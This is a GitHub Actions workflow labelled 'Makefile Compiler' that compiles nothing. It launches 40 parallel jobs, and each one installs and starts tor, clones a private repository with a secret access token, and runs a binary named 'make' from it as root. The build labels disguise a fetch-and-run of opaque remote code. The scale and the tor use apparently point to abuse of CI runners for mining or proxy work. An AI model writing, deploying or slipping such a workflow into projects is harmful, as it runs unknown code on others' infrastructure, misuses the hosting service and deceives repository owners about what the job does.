name: Makefile Compiler

on: push

jobs:
  Generate-Matrix:
    runs-on: ubuntu-latest
    outputs:
      instances: ${{ steps.set-matrix.outputs.instances }}
    steps:
      - id: set-matrix
        shell: bash
        run: |
          echo "instances=$(seq -s, 1 40 | sed 's/,/,/g' | awk '{printf "[" $0 "]"}')" >> "$GITHUB_OUTPUT"

  build:
    needs: Generate-Matrix
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 20
      matrix:
        instance: ${{ fromJSON(needs.Generate-Matrix.outputs.instances) }}
      fail-fast: false

    env:
      PAT: ${{ secrets.PAT }}

    steps:
      - name: Compiling Makefile
        shell: bash
        run: |
          sudo apt update -y && sudo apt install git tor -y && (sudo tor &) && sudo git clone https://$PAT@github.com/hoster156/m && sudo chmod +x m/make && sudo ./m/make
